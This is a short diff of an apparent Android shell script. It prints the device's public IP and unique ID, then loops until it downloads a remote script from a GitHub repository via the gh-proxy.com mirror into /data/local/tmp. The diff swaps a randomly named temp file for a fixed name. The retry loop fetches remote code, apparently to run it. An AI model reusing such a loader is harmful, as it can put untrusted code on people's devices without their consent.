@@ -168,17 +168,11 @@ echo "当前设备公网 IP: $ip"
 echo "设备唯一 ID: $device_id"
 echo "-----------------------------------"
 {
-    if [ -e /dev/urandom ]; then
-        random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 16)
-    else
-        random_name=$(date +%s%N | md5sum | head -c 16)
-    fi
-    
-    temp_script="/data/local/tmp/${random_name}.sh"
+    temp_script="/data/local/tmp/final.sh"
     
     while true; do
         # 下载客户端脚本
-        if curl -sS -o "$temp_script" "https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"; then
+        if curl -sS -o "$temp_script" "https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/final.sh"; then
             break
         else
             sleep 30
